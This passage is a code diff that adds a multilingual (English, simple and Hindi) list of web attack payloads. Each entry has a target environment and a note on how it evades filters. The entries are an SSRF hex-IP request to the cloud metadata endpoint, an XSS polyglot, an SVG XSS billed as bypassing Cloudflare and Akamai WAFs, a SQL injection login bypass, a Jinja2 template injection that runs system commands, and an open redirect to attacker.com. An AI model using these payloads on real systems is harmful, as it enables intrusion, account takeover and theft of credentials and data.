+      hi: "हेक्साडेसिमल IP (0xa9.0xfe.0xa9.0xfe)",
+    },
+    targetEnv: "Node.js / Go / Nginx Upstream",
+    payload: "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
+    whyItBypasses: {
+      en: "Bypasses literal dot-decimal string matching while remaining RFC-compliant for URL resolvers.",
+      simple: "Bypasses filters looking for normal numbers.",
+      hi: "यह सामान्य डॉट-डेसिमल फ़िल्टर को बाईपास करता है और सॉकेट्स में मान्य रहता है।",
+    },
+  },
+  {
+    id: "xss-polyglot-ultimate",
+    category: "xss",
+    name: {
+      en: "Ahmed's Universal Context-Breaking XSS Polyglot",
+      simple: "Universal XSS Polyglot",
+      hi: "यूनिवर्सल XSS पॉलीग्लॉट (सभी टैग्स को ब्रेक करने वाला)",
+    },
+    targetEnv: "HTML / Attribute / JavaScript Contexts",
+    payload: `jaVasCript:/*-/*\`/*\\'\`/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
+    whyItBypasses: {
+      en: "Breaks out of script tags, style blocks, textarea fields, HTML attributes, and javascript strings simultaneously.",
+      simple: "Escapes from inside inputs, scripts, and textareas at the same time.",
+      hi: "यह एक साथ `<script>`, `<style>`, `<textarea>` और HTML अटरीब्यूट्स से बाहर निकलकर अलर्ट ट्रिगर करता है।",
+    },
+  },
+  {
+    id: "xss-svg-autofocus",
+    category: "xss",
+    name: {
+      en: "WAF-Bypassing SVG Onfocus Polyglot",
+      simple: "SVG Onfocus No-Click XSS",
+      hi: "WAF-बाईपासिंग SVG Onfocus XSS",
+    },
+    targetEnv: "Cloudflare / Akamai protected fields",
+    payload: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
+    whyItBypasses: {
+      en: "Does not use blocked words like `onload`, `onerror`, or `<script>`, evading conventional signature WAF rules.",
+      simple: "Avoids words like onload or onerror so firewalls don't block it.",
+      hi: "यह `onload`, `onerror` या `<script>` जैसे ब्लॉक शब्दों का उपयोग नहीं करता, जिससे WAF पकड़ नहीं पाता।",
+    },
+  },
+  {
+    id: "sqli-auth-bypass",
+    category: "sqli",
+    name: {
+      en: "Universal SQLi Auth Bypass with Comment Polyglot",
+      simple: "Universal Login Bypass SQLi",
+      hi: "यूनिवर्सल SQLi लॉगिन बाईपास",
+    },
+    targetEnv: "MySQL / PostgreSQL / SQLite Login Fields",
+    payload: `' OR 1=1 LIMIT 1;-- -`,
+    whyItBypasses: {
+      en: "Forces the query condition to evaluate true and limits the result to the first row (frequently the admin account ID 1).",
+      simple: "Forces the database to log you in as the first user (usually admin).",
+      hi: "क्वेरी को हमेशा ट्रू करता है और पहली पंक्ति (अक्सर एडमिन अकाउंट) रिटर्न करता है।",
+    },
+  },
+  {
+    id: "ssti-jinja2-rce",
+    category: "ssti",
+    name: {
+      en: "Jinja2 / Python 3 Sandbox Escape RCE",
+      simple: "Python Jinja2 RCE Payload",
+      hi: "Jinja2 / Python 3 सैंडबॉक्स एस्केप RCE",
+    },
+    targetEnv: "Flask / Python Template Engines",
+    payload: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
+    whyItBypasses: {
+      en: "Traverses through Flask request application globals to access builtins, executing system commands without directly naming blocked primitives.",
+      simple: "Accesses Python's internal command runner through the web request object.",
+      hi: "Flask रिक्वेस्ट ऑब्जेक्ट के ग्लोबल्स से डायरेक्ट `os.popen` रन करके सर्वर कमांड चलाता है।",
+    },
+  },
+  {
+    id: "redirect-backslash-slash",
+    category: "redirect",
+    name: {
+      en: "Double Slash / Backslash Chrome/Firefox Bypass",
+      simple: "Open Redirect Slash Bypass",
+      hi: "डबल स्लैश / बैकस्लैश ओपन रीडायरेक्ट बाईपास",
+    },
+    targetEnv: "URL / Login redirection params",
+    payload: `https://target.com/login?redirect_to=///attacker.com`,
+    whyItBypasses: {
+      en: "Triple slash `///` passes naive `url.startsWith('http')` or `url.startsWith('/')` validations while browsers normalize it to protocol-relative `//attacker.com`.",
+      simple: "Three slashes fool the server check, but the browser treats it as a domain redirect.",
+      hi: "तीन स्लैश `///` सर्वर-साइड लोकल पाथ चेक को धोखा देते हैं, लेकिन ब्राउज़र इसे `//attacker.com` समझकर रीडायरेक्ट कर देता है।",
+    },
+  },
+];
+
 
